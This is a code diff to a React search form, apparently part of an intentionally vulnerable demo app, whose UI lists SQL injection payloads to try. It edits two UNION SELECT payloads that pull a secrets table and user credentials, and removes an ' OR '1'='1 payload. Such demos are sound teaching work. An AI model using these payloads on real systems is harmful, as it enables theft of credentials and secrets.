@@ -93,16 +93,12 @@ function SearchForm({ currentUser }) {
           <p className="demo-warning">Try these in the search field:</p>
           <div className="payload-examples">
             <div className="payload">
-              <code>' UNION SELECT id, secret_key, secret_value FROM secrets --</code>
+              <code>' UNION SELECT id, secret_key, secret_value FROM secrets -- '</code>
               <p>Extracts secrets from the secrets table</p>
             </div>
             <div className="payload">
-              <code>' UNION SELECT 1, username, password FROM users --</code>
+              <code>' UNION SELECT 1, username, password FROM users -- '</code>
               <p>Extracts user credentials</p>
-            </div>
-            <div className="payload">
-              <code>' OR '1'='1</code>
-              <p>Returns all records</p>
             </div>
             <div className="payload">
               <code>*</code>
